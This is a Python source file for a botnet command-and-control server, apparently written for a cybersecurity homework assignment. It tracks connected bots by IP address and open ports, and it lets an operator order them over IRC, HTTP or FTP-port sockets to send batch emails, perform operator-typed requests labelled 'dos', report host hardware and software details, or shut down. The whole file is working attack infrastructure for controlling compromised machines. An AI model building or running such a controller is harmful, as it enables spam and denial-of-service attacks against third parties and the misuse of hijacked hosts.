import socket
import sys
from threading import Thread
import json
import pprint
import requests
import subprocess
from email_loader import load_email
import os


# setting path
cwd = os.getcwd()
parent = "/".join(cwd.split('/')[:-1])
sys.path.append(parent)
# importing
import config
from utils.script import get_my_ip, exec_cmd



BOTS = {}
THREADS = []
EMAIL_PATH = r"/home/eddi/Desktop/hw_cybersec/CC/email.json"

# irc_client part (old irc_client.py)

def get_action(bot):
    action = input("Perform by bot: send batch email ('b'), custom http request ('c'), hardware/software ('i'), stop current action ('idle'), kill ('kill') or exit irc connection('exit'). . . ") 
    if action == 'b':
        try:
            email = load_email(EMAIL_PATH)
            return {"action": "email_batch", "content": json.dumps(email)}
        except:
            print(f"Email in {EMAIL_PATH} not parsable")
            return get_action(bot)
    elif action == 'c':
        return {"action": "dos", "content":  input(f"Type the request that you want {bot} to perform. . . ")}
    elif action == 'i':
        return {"action": "hwsw"}
    elif action == 'exit' or action == 'kill' or action == 'idle':
        return {"action": action}
    return get_action(bot)

def ftp_client_program():
    bot = input("[ftp] Type the ip of the bot you want to connect to. . . ")
    port = 21

    # connect to server
    client_socket = socket.socket()
    try:
        client_socket.connect((bot, port))
    except socket.error as serr:
        print(serr)
        if serr.errno == socket.errno.ECONNREFUSED:
            print(f"[ftp] Bot with ip {bot} not reachable, check bots reachable using command 'dump'")
            return {"action": "down", "content": bot}
        return -1

    while True:
        msg = get_action(bot)
        # print("sending ", msg)
        client_socket.send(json.dumps(msg).encode('utf-8'))

        action = msg["action"]
        try: content = msg["content"]
        except: pass


        if action == 'exit':
            client_socket.close()
            return 1
        elif action == "kill":
            client_socket.close()
            return {"action": "down", "content": bot}
        elif action == "hwsw":
            hw_sw_infos = client_socket.recv(4096).decode()
            hw_sw_infos = json.loads(hw_sw_infos)
            pprint.pprint(hw_sw_infos)           
        else:
            # performed action between (dos, batch email, idle)
            # set current action that bot is performing
            BOTS[bot]['status'][port] = action
            try:
                if action != "email_batch":
                    BOTS[bot]['status'][port] += f" -> ({content})"
            except: pass

    
    return 0



def http_client_program():
    bot = input("[http] Type the ip of the bot you want to connect to. . . ")
    port = 80

    while True:
        msg = get_action(bot)
        url = f"http://{bot}:{port}"

        action = msg["action"]
        try: content = msg["content"]
        except: pass

        if action == "hwsw":
            hw_sw_infos = requests.get(url+'/hwsw')
            hw_sw_infos = json.loads(hw_sw_infos.text)
            pprint.pprint(hw_sw_infos)
            continue            

        else:
            x = requests.post(url, json = msg)

        if action == 'exit':
            return 1
        elif action == "kill":
            return {"action": "down", "content": bot}
        else:
            # performed action between (dos, batch email, idle)
            # set current action that bot is performing
            BOTS[bot]['status'][port] = action
            try:
                if action != "email_batch":
                    BOTS[bot]['status'][port] += f" -> ({content})"
            except: pass

    return 0


def irc_client_program():
    bot = input("[IRC] Type the ip of the bot you want to connect to. . . ")
    port = 6667

    # connect to server
    client_socket = socket.socket()
    try:
        client_socket.connect((bot, port))
    except socket.error as serr:
        print(serr)
        if serr.errno == socket.errno.ECONNREFUSED:
            print(f"[IRC] Bot with ip {bot} not reachable, check bots reachable using command 'dump'")
            return {"action": "down", "content": bot}
        return -1

    while True:
        msg = get_action(bot)
        # print("sending ", msg)
        client_socket.send(json.dumps(msg).encode('utf-8'))

        action = msg["action"]
        try: content = msg["content"]
        except: pass

        if action == 'exit':
            client_socket.close()
            return 1
        elif action == "kill":
            client_socket.close()
            return {"action": "down", "content": bot}
        elif action == "hwsw":
            hw_sw_infos = client_socket.recv(4096).decode()
            hw_sw_infos = json.loads(hw_sw_infos)
            pprint.pprint(hw_sw_infos)            
        else:
            # performed action between (dos, batch email, idle)
            # set current action that bot is performing
            BOTS[bot]['status'][port] = action
            try:
                if action != "email_batch":
                    BOTS[bot]['status'][port] += f" -> ({content})"
            except: pass

    
    return 0

# C&C general part (old server.py)
def pprint_help():
    print("commands:")
    print("\t dump, \t returns a list of the active bots")
    print("\t irc, \t connect to a bot through irc and send tasks to perform")
    print("\t http, \t connect to a bot through http and send tasks to perform")
    print("\t ftp, \t connect to a bot through ftp and send tasks to perform")
    print("\t exit, \t exits")
    return

def dump():
    print("{: <20} {: <20} {: <20}".format('IP', 'PORTS', 'STATUS'))
    for k in BOTS:
        print("{: <20} {: <20} {: <20}".format(k, BOTS[k]['info_ports'], str(tuple(BOTS[k]['status'].values()))))
    return

def get_host_info(conn):
    # get info on ip
    ip = conn.recv(1024).decode()
    if not ip:
        conn.send("RST".encode())
        return 0
    conn.send("ACK".encode())

    # get info on open ports
    op = conn.recv(1024).decode()
    if not op:
        conn.send("RST".encode())
        return 0
    conn.send("ACK".encode())
    op = json.loads(op)
    return ip, op

def stop_cc():
    print("[-] Killing C&C")
    tmp_sock = socket.socket()
    tmp_sock.connect((config.server_info["ip"], config.server_info["port"]))
    return 

def cc_cli():

    while True:
        action = input("C&C>").lower()
        match action:
            case "irc":
                # returns a string formatted as 'kill:{ip}' to notify that the bot with {ip} has been killed
                ret = irc_client_program()
                if isinstance(ret, dict) and ret["action"] == "down":
                    try:
                        del BOTS[ret["content"]]
                    except: pass
            case "http":
                # returns a string formatted as 'kill:{ip}' to notify that the bot with {ip} has been killed
                ret = http_client_program()
                if isinstance(ret, dict) and ret["action"] == "down":
                    try:
                        del BOTS[ret["content"]]
                    except: pass
            case "ftp":
                # returns a string formatted as 'kill:{ip}' to notify that the bot with {ip} has been killed
                ret = ftp_client_program()
                if isinstance(ret, dict) and ret["action"] == "down":
                    try:
                        del BOTS[ret["content"]]
                    except: pass
            case "dump":
                dump()
            case "exit":
                break
            case _:
                pprint_help()
    stop_cc()
    return

def handle_bot_connection():
    # get the hostname
    host = config.server_info["ip"]
    port = config.server_info["port"]
    clients = 2

    server_socket = socket.socket()  # get instance
    server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    # look closely. The bind() function takes tuple as argument
    server_socket.bind((host, port))  # bind host address and port together

    # configure how many client the server can listen simultaneously
    server_socket.listen(clients)
    # print(f"C&C listening on {host}:{port}")
    while True:
        conn, address = server_socket.accept()  # accept new connection
        # print('Connected to :', address[0], ':', address[1])
        if address[0] == config.server_info["ip"]:
            break
        host_ip, host_ports = get_host_info(conn)
        BOTS[str(host_ip)] = {"info_ports": '(' + ", ".join(host_ports) + ')', "status": {int(port): "idle" for port in host_ports}}
        # print(f"[+] New bot connected:\n\t got info about {str(address)}: \nip: \n\t{host_ip} \nopen ports: \n\t{host_ports}")
        conn.close()
    server_socket.close()
    return

def server_program():
    
    thread_connections = Thread(target=handle_bot_connection)
    thread_connections.start()

    thread_cc_cli = Thread(target=cc_cli)
    thread_cc_cli.start()



if __name__ == '__main__':
    server_program()